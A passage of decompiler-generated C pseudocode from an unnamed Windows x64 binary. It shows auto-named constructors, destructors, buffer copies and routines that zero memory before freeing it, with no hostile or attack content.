  if ( *(_QWORD *)(a2 + 168) > 0x28ui64 || *(_BYTE *)(a1 + 161) )
    a1 = 0i64;
  else
    *(_BYTE *)(a1 + 161) = 1;
  *(_QWORD *)(v3 + 176) = a1;
  v4 = *(const void **)(a2 + 176);
  if ( v4 )
    memcpy_s((void *)a1, 4 * v2, v4, 4i64 * *(_QWORD *)(a2 + 168));
  return v3;
}

//----- (0000000140088090) ----------------------------------------------------
__int64 __fastcall sub_140088090(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 v3; // rbx
  const void *v4; // r8

  *(_BYTE *)(a1 + 529) = 0;
  v2 = *(_QWORD *)(a2 + 536);
  v3 = a1;
  *(_QWORD *)(a1 + 536) = v2;
  if ( *(_QWORD *)(a2 + 536) > 0x84ui64 || *(_BYTE *)(a1 + 529) )
    a1 = 0i64;
  else
    *(_BYTE *)(a1 + 529) = 1;
  *(_QWORD *)(v3 + 544) = a1;
  v4 = *(const void **)(a2 + 544);
  if ( v4 )
    memcpy_s((void *)a1, 4 * v2, v4, 4i64 * *(_QWORD *)(a2 + 536));
  return v3;
}

//----- (0000000140088110) ----------------------------------------------------
_QWORD *__fastcall sub_140088110(_QWORD *a1)
{
  _QWORD *v1; // rdi
  _QWORD *v3; // [rsp+40h] [rbp+8h]

  v1 = a1;
  sub_140036DA0((__int64)(a1 + 1), 1);
  v3 = v1 + 3;
  v3[2] = &unk_1400B2D00;
  v3[1] = off_1400AAEE8;
  *(_QWORD *)((char *)v3 + *(signed int *)(v1[5] + 4i64) + 16) = &off_1400AAF30;
  *v3 = &off_1400B2C20;
  v3[1] = off_1400B2C60;
  *(_QWORD *)((char *)v3 + *(signed int *)(v1[5] + 4i64) + 16) = off_1400B2CA8;
  sub_14003C210(v1 + 6);
  sub_14003C210(v1 + 11);
  return v1;
}
// 1400AAEE8: using guessed type __int64 (__fastcall *off_1400AAEE8[4])();
// 1400AAF30: using guessed type __int64 (__fastcall *off_1400AAF30)();
// 1400B2C20: using guessed type __int64 (__fastcall *off_1400B2C20)(void *);
// 1400B2C60: using guessed type __int64 (__fastcall *off_1400B2C60[17])();
// 1400B2CA8: using guessed type __int64 (__fastcall *off_1400B2CA8[8])();

//----- (00000001400881C0) ----------------------------------------------------
_QWORD *__fastcall sub_1400881C0(_QWORD *a1, _QWORD *a2, char a3, int a4)
{
  char v4; // si
  _QWORD *v5; // rbp
  _QWORD *v6; // rdi

  v4 = a3;
  v5 = a2;
  v6 = a1;
  if ( a4 )
  {
    *a1 = &unk_1400A6BB0;
    a1[2] = &unk_1400A6BB8;
    a1[19] = std::ios_base::`vftable';
    a1[19] = std::basic_ios<char,std::char_traits<char>>::`vftable';
  }
  std::basic_iostream<char,std::char_traits<char>>::basic_iostream<char,std::char_traits<char>>(a1, a1 + 3, 0i64);
  *(_QWORD *)((char *)v6 + *(signed int *)(*v6 + 4i64)) = &off_1400A6BA8;
  *(_DWORD *)((char *)v6 + *(signed int *)(*v6 + 4i64) - 4) = *(_DWORD *)(*v6 + 4i64) - 152;
  sub_14006F400(v6 + 3, v5, v4);
  return v6;
}
// 1400A15D0: using guessed type __int64 __fastcall std::basic_iostream<char,std::char_traits<char>>::basic_iostream<char,std::char_traits<char>>(_QWORD, _QWORD, _QWORD);
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400A1640: using guessed type void *std::ios_base::`vftable';
// 1400A6BA8: using guessed type __int64 (__fastcall *off_1400A6BA8)();

//----- (0000000140088280) ----------------------------------------------------
__int64 __fastcall sub_140088280(__int64 a1)
{
  __int64 v1; // rbx
  signed __int64 v2; // rcx
  signed __int64 v3; // rax

  v1 = a1;
  sub_140036DA0(a1 + 8, 1);
  *(_BYTE *)(v1 + 185) = 0;
  *(_QWORD *)(v1 + 192) = 40i64;
  if ( *(_BYTE *)(v1 + 185) )
  {
    v2 = 0i64;
  }
  else
  {
    *(_BYTE *)(v1 + 185) = 1;
    v2 = v1 + 24;
  }
  v3 = v1 + 208;
  *(_QWORD *)(v1 + 200) = v2;
  *(_BYTE *)(v3 + 4097) = 0;
  *(_QWORD *)(v3 + 4104) = 1024i64;
  if ( *(_BYTE *)(v1 + 4305) )
  {
    *(_QWORD *)(v1 + 4320) = 0i64;
  }
  else
  {
    *(_BYTE *)(v1 + 4305) = 1;
    *(_QWORD *)(v1 + 4320) = v1 + 208;
  }
  return v1;
}

//----- (0000000140088700) ----------------------------------------------------
__int64 __fastcall sub_140088700(__int64 a1)
{
  _DWORD *v1; // rdi
  __int64 v2; // rdx
  __int64 result; // rax
  __int64 i; // rcx

  v1 = *(_DWORD **)(a1 + 176);
  v2 = *(_QWORD *)(a1 + 168);
  if ( v1 == (_DWORD *)a1 )
  {
    *(_BYTE *)(a1 + 161) = 0;
    result = 0i64;
    for ( i = v2; i; --i )
    {
      *v1 = 0;
      ++v1;
    }
  }
  return result;
}

//----- (0000000140088730) ----------------------------------------------------
signed __int64 __fastcall sub_140088730(__int64 a1)
{
  signed __int64 v1; // rax
  __int64 v2; // rdx
  _DWORD *v3; // rdi
  __int64 v4; // rcx
  _DWORD *v5; // rdi
  __int64 v6; // rcx
  signed __int64 result; // rax

  v1 = a1 + 120;
  v2 = a1;
  v3 = *(_DWORD **)(a1 + 4232);
  v4 = *(_QWORD *)(a1 + 4224);
  if ( v3 == (_DWORD *)v1 )
  {
    *(_BYTE *)(v1 + 4097) = 0;
    while ( v4 )
    {
      *v3 = 0;
      ++v3;
      --v4;
    }
  }
  v5 = *(_DWORD **)(v2 + 112);
  v6 = *(_QWORD *)(v2 + 104);
  result = v2 + 24;
  if ( v5 == (_DWORD *)(v2 + 24) )
  {
    *(_BYTE *)(v2 + 97) = 0;
    result = 0i64;
    while ( v6 )
    {
      *v5 = 0;
      ++v5;
      --v6;
    }
  }
  return result;
}

//----- (0000000140088780) ----------------------------------------------------
void __fastcall sub_140088780(__int64 a1)
{
  _DWORD *v1; // rdx
  __int64 v2; // rcx
  _DWORD *v3; // rdi

  v1 = *(_DWORD **)(a1 + 48);
  v2 = *(_QWORD *)(a1 + 40);
  v3 = v1;
  while ( v2 )
  {
    *v3 = 0;
    ++v3;
    --v2;
  }
  free(v1);
}

//----- (00000001400887B0) ----------------------------------------------------
_DWORD *__fastcall sub_1400887B0(__int64 a1)
{
  _DWORD *v1; // rdi
  __int64 v2; // rdx
  signed __int64 v3; // rcx
  _DWORD *result; // rax
  __int64 i; // rcx

  v1 = *(_DWORD **)(a1 + 296);
  v2 = *(_QWORD *)(a1 + 288);
  v3 = a1 + 32;
  result = (_DWORD *)(v3 + (-(signed int)v3 & 0xF));
  if ( v1 == result )
  {
    *(_BYTE *)(v3 + 249) = 0;
    result = 0i64;
    for ( i = v2; i; --i )
    {
      *v1 = 0;
      ++v1;
    }
  }
  return result;
}

//----- (00000001400887F0) ----------------------------------------------------
__int64 __fastcall sub_1400887F0(__int64 a1)
{
  _DWORD *v1; // rdi
  __int64 v2; // rdx
  signed __int64 v3; // rcx
  __int64 result; // rax
  __int64 i; // rcx

  v1 = *(_DWORD **)(a1 + 568);
  v2 = *(_QWORD *)(a1 + 560);
  v3 = a1 + 24;
  if ( v1 == (_DWORD *)v3 )
  {
    *(_BYTE *)(v3 + 529) = 0;
    result = 0i64;
    for ( i = v2; i; --i )
    {
      *v1 = 0;
      ++v1;
    }
  }
  return result;
}

//----- (0000000140088820) ----------------------------------------------------
signed __int64 __fastcall sub_140088820(__int64 a1)
{
  _DWORD *v1; // rdi
  signed __int64 v2; // rax
  __int64 v3; // rdx
  __int64 v4; // rcx
  signed __int64 result; // rax
  _DWORD *v6; // rdi
  __int64 v7; // rcx

  v1 = *(_DWORD **)(a1 + 4320);
  v2 = a1 + 208;
  v3 = a1;
  v4 = *(_QWORD *)(a1 + 4312);
  if ( v1 == (_DWORD *)v2 )
  {
    *(_BYTE *)(v2 + 4097) = 0;
    while ( v4 )
    {
      *v1 = 0;
      ++v1;
      --v4;
    }
  }
  result = v3 + 24;
  v6 = *(_DWORD **)(v3 + 200);
  v7 = *(_QWORD *)(v3 + 192);
  if ( v6 == (_DWORD *)(v3 + 24) )
  {
    *(_BYTE *)(v3 + 185) = 0;
    result = 0i64;
    while ( v7 )
    {
      *v6 = 0;
      ++v6;
      --v7;
    }
  }
  return result;
}

//----- (0000000140088880) ----------------------------------------------------
void __fastcall sub_140088880(__int64 a1)
{
  _DWORD *v1; // rdx
  __int64 v2; // rcx
  _DWORD *v3; // rdi

  v1 = *(_DWORD **)(a1 + 16);
  v2 = *(_QWORD *)(a1 + 8);
  v3 = v1;
  while ( v2 )
  {
    *v3 = 0;
    ++v3;
    --v2;
  }
  free(v1);
}

//----- (00000001400888B0) ----------------------------------------------------
void __fastcall sub_1400888B0(__int64 a1)
{
  signed __int64 v1; // rbx
  void *v2; // rdx
  void *v3; // rdx

  v1 = a1 + 24;
  v2 = *(void **)(a1 + 112);
  memset(*(void **)(a1 + 112), 0, 8i64 * *(_QWORD *)(a1 + 104));
  free(v2);
  v3 = *(void **)(v1 + 48);
  memset(*(void **)(v1 + 48), 0, 8i64 * *(_QWORD *)(v1 + 40));
  free(v3);
}

//----- (0000000140088910) ----------------------------------------------------
void __fastcall sub_140088910(__int64 a1)
{
  __int64 v1; // rbx
  unsigned __int64 v2; // rdx
  void *v3; // r8

  v1 = a1;
  v2 = *(_QWORD *)(a1 + 80);
  v3 = *(void **)(a1 + 88);
  memset(*(void **)(a1 + 88), 0, *(_QWORD *)(a1 + 80));
  if ( v2 < 0x10 )
    free(v3);
  else
    aligned_free(v3);
  sub_14004E270(v1);
}

//----- (0000000140088970) ----------------------------------------------------
void __fastcall sub_140088970(__int64 a1)
{
  __int64 v1; // rbx
  unsigned __int64 v2; // rdx
  void *v3; // r8

  v1 = a1;
  v2 = *(_QWORD *)(a1 + 80);
  v3 = *(void **)(a1 + 88);
  memset(*(void **)(a1 + 88), 0, *(_QWORD *)(a1 + 80));
  if ( v2 < 0x10 )
    free(v3);
  else
    aligned_free(v3);
  sub_14004E270(v1);
}

//----- (00000001400889D0) ----------------------------------------------------
void __fastcall sub_1400889D0(__int64 a1)
{
  __int64 v1; // rbx
  unsigned __int64 v2; // rdx
  void *v3; // r8

  v1 = a1;
  v2 = *(_QWORD *)(a1 + 80);
  v3 = *(void **)(a1 + 88);
  memset(*(void **)(a1 + 88), 0, *(_QWORD *)(a1 + 80));
  if ( v2 < 0x10 )
    free(v3);
  else
    aligned_free(v3);
  sub_14004E270(v1);
}

//----- (0000000140088A30) ----------------------------------------------------
void __fastcall sub_140088A30(__int64 a1)
{
  __int64 v1; // rbx
  unsigned __int64 v2; // rdx
  void *v3; // r8

  v1 = a1;
  v2 = *(_QWORD *)(a1 + 80);
  v3 = *(void **)(a1 + 88);
  memset(*(void **)(a1 + 88), 0, *(_QWORD *)(a1 + 80));
  if ( v2 < 0x10 )
    free(v3);
  else
    aligned_free(v3);
  sub_14004E270(v1);
}

//----- (0000000140088A90) ----------------------------------------------------
void __fastcall sub_140088A90(__int64 a1)
{
  __int64 v1; // rbx
  unsigned __int64 v2; // rdx
  void *v3; // r8

  v1 = a1;
  v2 = *(_QWORD *)(a1 + 80);
  v3 = *(void **)(a1 + 88);
  memset(*(void **)(a1 + 88), 0, *(_QWORD *)(a1 + 80));
  if ( v2 < 0x10 )
    free(v3);
  else
    aligned_free(v3);
  sub_14004E270(v1);
}

//----- (0000000140088AF0) ----------------------------------------------------
__int64 __fastcall sub_140088AF0(__int64 (__fastcall ****a1)(_QWORD, signed __int64))
{
  __int64 (__fastcall ***v1)(_QWORD, signed __int64); // rcx
  __int64 result; // rax

  v1 = *a1;
  if ( v1 )
    result = (**v1)(v1, 1i64);
  return result;
}

//----- (0000000140088C20) ----------------------------------------------------
void __fastcall sub_140088C20(__int64 a1)
{
  __int64 v1; // rbx
  void *v2; // rdx
  void *v3; // rdx

  v1 = a1;
  v2 = *(void **)(a1 + 88);
  memset(*(void **)(a1 + 88), 0, 8i64 * *(_QWORD *)(a1 + 80));
  free(v2);
  v3 = *(void **)(v1 + 48);
  memset(*(void **)(v1 + 48), 0, 8i64 * *(_QWORD *)(v1 + 40));
  free(v3);
}

//----- (0000000140088C78) ----------------------------------------------------
_QWORD *__fastcall sub_140088C78(__int64 a1, char a2)
{
  return sub_140088D10((void *)(a1 - 8), a2);
}

//----- (0000000140088C84) ----------------------------------------------------
void *__fastcall sub_140088C84(__int64 a1, char a2)
{
  return sub_140088D80((void *)(a1 - 8), a2);
}

//----- (0000000140088C90) ----------------------------------------------------
void *__fastcall sub_140088C90(__int64 a1, char a2)
{
  return sub_140088DD0((void *)(a1 - 8), a2);
}

//----- (0000000140088C9C) ----------------------------------------------------
_QWORD *__fastcall sub_140088C9C(__int64 a1, char a2)
{
  return sub_140088E20((void *)(a1 - 8), a2);
}

//----- (0000000140088CA8) ----------------------------------------------------
void *__fastcall sub_140088CA8(__int64 a1, char a2)
{
  return sub_140088E90((void *)(a1 - 8), a2);
}

//----- (0000000140088CB4) ----------------------------------------------------
void *__fastcall sub_140088CB4(__int64 a1, char a2)
{
  return sub_140088EC0((void *)(a1 - 8), a2);
}

//----- (0000000140088CC0) ----------------------------------------------------
void *__fastcall sub_140088CC0(__int64 a1, char a2)
{
  return sub_140088EF0((void *)(a1 - 8), a2);
}

//----- (0000000140088CCC) ----------------------------------------------------
void *__fastcall sub_140088CCC(__int64 a1, char a2)
{
  return sub_140088F20((void *)(a1 - 8), a2);
}

//----- (0000000140088CD8) ----------------------------------------------------
void *__fastcall sub_140088CD8(__int64 a1, char a2)
{
  return sub_140088F50((void *)(a1 - 8), a2);
}

//----- (0000000140088CE4) ----------------------------------------------------
void *__fastcall sub_140088CE4(__int64 a1, char a2)
{
  return sub_140088F80((void *)(a1 - 8), a2);
}

//----- (0000000140088CF0) ----------------------------------------------------
void *__fastcall sub_140088CF0(__int64 a1, char a2)
{
  return sub_140089030((void *)(a1 - 8), a2);
}

//----- (0000000140088CFC) ----------------------------------------------------
void *__fastcall sub_140088CFC(__int64 a1, char a2)
{
  return sub_140089030((void *)(a1 - 104), a2);
}

//----- (0000000140088D10) ----------------------------------------------------
_QWORD *__fastcall sub_140088D10(void *a1, char a2)
{
  char *v2; // rax
  _QWORD *v3; // rbx
  char *v4; // rdi
  __int64 v5; // rcx
  _DWORD *v6; // rdi
  __int64 v7; // rcx

  v2 = (char *)a1 + 120;
  v3 = a1;
  v4 = (char *)*((_QWORD *)a1 + 529);
  v5 = *((_QWORD *)a1 + 528);
  if ( v4 == v2 )
  {
    v2[4097] = 0;
    while ( v5 )
    {
      *(_DWORD *)v4 = 0;
      v4 += 4;
      --v5;
    }
  }
  v6 = (_DWORD *)v3[14];
  v7 = v3[13];
  if ( v6 == (_DWORD *)(v3 + 3) )
  {
    *((_BYTE *)v3 + 97) = 0;
    while ( v7 )
    {
      *v6 = 0;
      ++v6;
      --v7;
    }
  }
  if ( a2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140088D80) ----------------------------------------------------
void *__fastcall sub_140088D80(void *a1, char a2)
{
  _DWORD *v2; // r8
  void *v3; // rsi
  __int64 v4; // rcx
  _DWORD *v5; // rdi
  char v6; // bl

  v2 = (_DWORD *)*((_QWORD *)a1 + 6);
  v3 = a1;
  v4 = *((_QWORD *)a1 + 5);
  v5 = v2;
  v6 = a2;
  while ( v4 )
  {
    *v5 = 0;
    ++v5;
    --v4;
  }
  free(v2);
  if ( v6 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140088DD0) ----------------------------------------------------
void *__fastcall sub_140088DD0(void *a1, char a2)
{
  char *v2; // rax
  void *v3; // rbx
  char *v4; // rdi
  __int64 v5; // rcx

  v2 = (char *)a1 + 24;
  v3 = a1;
  v4 = (char *)*((_QWORD *)a1 + 71);
  v5 = *((_QWORD *)a1 + 70);
  if ( v4 == v2 )
  {
    v2[529] = 0;
    while ( v5 )
    {
      *(_DWORD *)v4 = 0;
      v4 += 4;
      --v5;
    }
  }
  if ( a2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140088E20) ----------------------------------------------------
_QWORD *__fastcall sub_140088E20(void *a1, char a2)
{
  char *v2; // rdi
  char *v3; // rax
  _QWORD *v4; // rbx
  __int64 v5; // rcx
  _DWORD *v6; // rdi
  __int64 v7; // rcx

  v2 = (char *)*((_QWORD *)a1 + 540);
  v3 = (char *)a1 + 208;
  v4 = a1;
  v5 = *((_QWORD *)a1 + 539);
  if ( v2 == v3 )
  {
    v3[4097] = 0;
    while ( v5 )
    {
      *(_DWORD *)v2 = 0;
      v2 += 4;
      --v5;
    }
  }
  v6 = (_DWORD *)v4[25];
  v7 = v4[24];
  if ( v6 == (_DWORD *)(v4 + 3) )
  {
    *((_BYTE *)v4 + 185) = 0;
    while ( v7 )
    {
      *v6 = 0;
      ++v6;
      --v7;
    }
  }
  if ( a2 & 1 )
    operator delete(v4);
  return v4;
}

//----- (0000000140088E90) ----------------------------------------------------
void *__fastcall sub_140088E90(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140088430();
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 140088430: using guessed type __int64 sub_140088430(void);

//----- (0000000140088EC0) ----------------------------------------------------
void *__fastcall sub_140088EC0(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_1400884D0();
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400884D0: using guessed type __int64 sub_1400884D0(void);

//----- (0000000140088EF0) ----------------------------------------------------
void *__fastcall sub_140088EF0(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140088550();
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 140088550: using guessed type __int64 sub_140088550(void);

//----- (0000000140088F20) ----------------------------------------------------
void *__fastcall sub_140088F20(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_1400885E0();
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400885E0: using guessed type __int64 sub_1400885E0(void);

//----- (0000000140088F50) ----------------------------------------------------
void *__fastcall sub_140088F50(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140088660();
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 140088660: using guessed type __int64 sub_140088660(void);

//----- (0000000140088F80) ----------------------------------------------------
void *__fastcall sub_140088F80(void *a1, char a2)
{
  char v2; // si
  void *v3; // rbp
  char *v4; // rbx
  void *v5; // r8
  void *v6; // rdx

  v2 = a2;
  v3 = a1;
  v4 = (char *)a1 + 24;
  v5 = (void *)*((_QWORD *)a1 + 14);
  memset(*((void **)a1 + 14), 0, 8i64 * *((_QWORD *)a1 + 13));
  free(v5);
  v6 = (void *)*((_QWORD *)v4 + 6);
  memset(*((void **)v4 + 6), 0, 8i64 * *((_QWORD *)v4 + 5));
  free(v6);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140089010) ----------------------------------------------------
void *__fastcall sub_140089010(void *a1, char a2)
{
  void *v2; // rbx

  v2 = a1;
  if ( a2 & 1 )
    operator delete(a1);
  return v2;
}

//----- (0000000140089030) ----------------------------------------------------
void *__fastcall sub_140089030(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rsi
  void *v4; // r8
  void *v5; // rdx

  v2 = a2;
  v3 = a1;
  v4 = (void *)*((_QWORD *)a1 + 11);
  memset(*((void **)a1 + 11), 0, 8i64 * *((_QWORD *)a1 + 10));
  free(v4);
  v5 = (void *)*((_QWORD *)v3 + 6);
  memset(*((void **)v3 + 6), 0, 8i64 * *((_QWORD *)v3 + 5));
  free(v5);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (00000001400890B0) ----------------------------------------------------
__int64 __fastcall sub_1400890B0(__int64 a1)
{
  __int64 result; // rax

  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 8) + 160i64))(a1 - 8);
  if ( result )
    result += 16i64;
  return result;
}

//----- (00000001400890E0) ----------------------------------------------------
_QWORD *__fastcall sub_1400890E0(__int64 a1, _QWORD *a2)
{
  size_t v2; // rbx
  _QWORD *v3; // rsi
  _QWORD *v4; // rax
  _BYTE *v5; // rdi
  void *Src; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  unsigned __int64 v9; // [rsp+40h] [rbp-18h]

  v2 = 0i64;
  v3 = a2;
  v4 = sub_14008A6D0(&Src);
  v5 = v4;
  if ( v4[3] >= 0x10ui64 )
    v5 = (_BYTE *)*v4;
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  v3[3] = 15i64;
  v3[2] = 0i64;
  *(_BYTE *)v3 = 0;
  if ( *v5 )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( v5[v2] );
  }
  sub_140004F20(v3, v5, v2);
  return v3;
}

//----- (00000001400891A0) ----------------------------------------------------
_QWORD *__fastcall sub_1400891A0(__int64 a1, _QWORD *a2)
{
  size_t v2; // rbx
  _QWORD *v3; // rsi
  _QWORD *v4; // rax
  _BYTE *v5; // rdi
  void *Src; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  unsigned __int64 v9; // [rsp+40h] [rbp-18h]

  v2 = 0i64;
  v3 = a2;
  v4 = sub_14008AFC0(&Src);
  v5 = v4;
  if ( v4[3] >= 0x10ui64 )
    v5 = (_BYTE *)*v4;
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  v3[3] = 15i64;
  v3[2] = 0i64;
  *(_BYTE *)v3 = 0;
  if ( *v5 )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( v5[v2] );
  }
  sub_140004F20(v3, v5, v2);
  return v3;
}

//----- (0000000140089260) ----------------------------------------------------
_QWORD *__fastcall sub_140089260(__int64 a1, _QWORD *a2)
{
  size_t v2; // rbx
  _QWORD *v3; // rsi
  _QWORD *v4; // rax
  _BYTE *v5; // rdi
  void *Src; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  unsigned __int64 v9; // [rsp+40h] [rbp-18h]

  v2 = 0i64;
  v3 = a2;
  v4 = sub_14008B190(&Src);
  v5 = v4;
  if ( v4[3] >= 0x10ui64 )
    v5 = (_BYTE *)*v4;
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  v3[3] = 15i64;
  v3[2] = 0i64;
  *(_BYTE *)v3 = 0;
  if ( *v5 )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( v5[v2] );
  }
  sub_140004F20(v3, v5, v2);
  return v3;
}

//----- (0000000140089320) ----------------------------------------------------
_QWORD *__fastcall sub_140089320(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx

  v2 = a2;
  sub_14008B730(a2);
  return v2;
}

//----- (0000000140089350) ----------------------------------------------------
_QWORD *__fastcall sub_140089350(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx

  v2 = a2;
  sub_14008B840(a2);
  return v2;
}

//----- (0000000140089380) ----------------------------------------------------
_QWORD *__fastcall sub_140089380(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx

  v2 = a2;
  sub_14008B950(a2);
  return v2;
}

//----- (00000001400893B0) ----------------------------------------------------
_QWORD *__fastcall sub_1400893B0(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx

  v2 = a2;
  sub_14008BA60(a2);
  return v2;
}

//----- (00000001400893E0) ----------------------------------------------------
_QWORD *__fastcall sub_1400893E0(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx

  v2 = a2;
  sub_14008BB70(a2);
  return v2;
}

//----- (0000000140089410) ----------------------------------------------------
_QWORD *__fastcall sub_140089410(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx

  v2 = a2;
  sub_14008BC80(a2);
  return v2;
}

//----- (0000000140089440) ----------------------------------------------------
_QWORD *__fastcall sub_140089440(__int64 a1, _QWORD *a2)
{
  size_t v2; // rbx
  _QWORD *v3; // rsi
  _QWORD *v4; // rax
  _BYTE *v5; // rdi
  void *Src; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  unsigned __int64 v9; // [rsp+40h] [rbp-18h]

  v2 = 0i64;
  v3 = a2;
  v4 = sub_14008A500(&Src);
  v5 = v4;
  if ( v4[3] >= 0x10ui64 )
    v5 = (_BYTE *)*v4;
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  v3[3] = 15i64;
  v3[2] = 0i64;
  *(_BYTE *)v3 = 0;
  if ( *v5 )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( v5[v2] );
  }
  sub_140004F20(v3, v5, v2);
  return v3;
}

//----- (0000000140089500) ----------------------------------------------------
void __fastcall __noreturn sub_140089500(__int64 a1)
{
  (*(void (__fastcall **)(__int64))(*(_QWORD *)(a1 + 16) + 16i64))(a1 + 16);
  sub_14004E7D0();
}

//----- (0000000140089520) ----------------------------------------------------
__int64 __fastcall sub_140089520(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx

  v4 = a2;
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 56i64))(a1, a2, a4);
  return v4;
}

//----- (0000000140089550) ----------------------------------------------------
signed __int64 __fastcall sub_140089550(__int64 a1)
{
  __int64 v1; // rdi
  _QWORD *v2; // rax
  _QWORD *v3; // rbx
  signed __int64 result; // rax

  v1 = a1;
  v2 = operator new(0x1090ui64);
  v3 = v2;
  if ( v2 )
  {
    sub_14007AD40((__int64)v2, v1 - 8);
    *v3 = &off_1400B04E0;
    v3[1] = off_1400B2D98;
  }
  else
  {
    v3 = 0i64;
  }
  if ( v3 )
    result = (signed __int64)(v3 + 1);
  else
    result = 0i64;
  return result;
}
// 1400B04E0: using guessed type __int64 (__fastcall *off_1400B04E0)(void *);
// 1400B2D98: using guessed type __int64 (__fastcall *off_1400B2D98[2])();

//----- (00000001400895C0) ----------------------------------------------------
signed __int64 __fastcall sub_1400895C0(__int64 a1)
{
  __int64 v1; // rdi
  _BYTE *v2; // rbx
  signed __int64 v3; // rdx
  _BYTE *v4; // rax
  signed __int64 result; // rax

  v1 = a1;
  v2 = operator new(0x38ui64);
  if ( v2 )
  {
    v3 = v1 - 8;
    if ( v1 == 8 )
      v4 = 0i64;
    else
      v4 = (_BYTE *)(v3 + 16);
    v2[16] = *v4;
    *((_DWORD *)v2 + 6) = *(_DWORD *)(v3 + 24);
    sub_140087FA0((__int64)(v2 + 32), v3 + 32);
    *(_QWORD *)v2 = &off_1400B3420;
    *((_QWORD *)v2 + 1) = off_1400B3498;
  }
  else
  {
    v2 = 0i64;
  }
  if ( v2 )
    result = (signed __int64)(v2 + 8);
  else
    result = 0i64;
  return result;
}
// 1400B3420: using guessed type __int64 (__fastcall *off_1400B3420)(void *);
// 1400B3498: using guessed type __int64 (__fastcall *off_1400B3498[2])();

//----- (0000000140089650) ----------------------------------------------------
signed __int64 __fastcall sub_140089650(__int64 a1)
{
  __int64 v1; // rdi
  _BYTE *v2; // rbx
  signed __int64 v3; // rdx
  _BYTE *v4; // rax
  signed __int64 result; // rax

  v1 = a1;
  v2 = operator new(0x130ui64);
  if ( v2 )
  {
    v3 = v1 - 8;
    if ( v1 == 8 )
      v4 = 0i64;
    else
      v4 = (_BYTE *)(v3 + 16);
    v2[16] = *v4;
    *((_DWORD *)v2 + 6) = *(_DWORD *)(v3 + 24);
    sub_14004DA90((__int64)(v2 + 32), v3 + 32);
    *(_QWORD *)v2 = &off_1400B2EE0;
    *((_QWORD *)v2 + 1) = off_1400B2F58;
  }
  else
  {
    v2 = 0i64;
  }
  if ( v2 )
    result = (signed __int64)(v2 + 8);
  else
    result = 0i64;
  return result;
}
// 1400B2EE0: using guessed type __int64 (__fastcall *off_1400B2EE0)(void *);
// 1400B2F58: using guessed type __int64 (__fastcall *off_1400B2F58[2])();

//----- (00000001400896E0) ----------------------------------------------------
signed __int64 __fastcall sub_1400896E0(__int64 a1)
{
  __int64 v1; // rdi
  _WORD *v2; // rbx
  signed __int64 v3; // rdx
  _WORD *v4; // rax
  signed __int64 result; // rax

  v1 = a1;
  v2 = operator new(0x240ui64);
  if ( v2 )
  {
    v3 = v1 - 8;
    if ( v1 == 8 )
      v4 = 0i64;
    else
      v4 = (_WORD *)(v3 + 16);
    v2[8] = *v4;
    sub_140088090((__int64)(v2 + 12), v3 + 24);
    *(_QWORD *)v2 = &off_1400B3260;
    *((_QWORD *)v2 + 1) = off_1400B32D8;
  }
  else
  {
    v2 = 0i64;
  }
  if ( v2 )
    result = (signed __int64)(v2 + 4);
  else
    result = 0i64;
  return result;
}
// 1400B3260: using guessed type __int64 (__fastcall *off_1400B3260)(void *);
// 1400B32D8: using guessed type __int64 (__fastcall *off_1400B32D8[2])();

//----- (0000000140089770) ----------------------------------------------------
_QWORD *__fastcall sub_140089770(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *result; // rax

  v1 = a1;
  result = operator new(0x10E8ui64);
  if ( result )
    result = sub_140087910((__int64)result, v1 - 8);
  if ( result )
    ++result;
  return result;
}

//----- (00000001400897C0) ----------------------------------------------------
char __fastcall sub_1400897C0(char *a1, __int64 a2, __int64 a3, void *a4)
{
  __int64 v4; // r14
  __int64 v5; // rbx
